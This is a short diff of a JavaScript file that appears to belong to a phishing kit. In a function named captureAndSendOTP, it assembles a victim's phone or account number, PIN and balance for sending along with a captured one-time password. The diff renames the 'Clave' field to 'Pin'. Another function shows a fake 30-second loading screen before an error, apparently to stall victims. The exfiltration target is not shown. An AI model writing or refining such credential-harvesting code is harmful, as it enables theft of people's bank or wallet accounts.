@@ -124,7 +124,7 @@ async function captureAndSendOTP() {
     if (loginData) {
         datosLogin = "#2\n" +
             "Numero: " + loginData.numero + "\n" +
-            "Clave: " + loginData.clave + "\n" +
+            "Pin: " + loginData.pin + "\n" +
             "Saldo: " + loginData.saldo + "\n";
     }
 
@@ -213,6 +213,7 @@ function mostrarCargaYError() {
 
   }, 30000); // ⏱️ tiempo de carga
 }
+
 
 
 
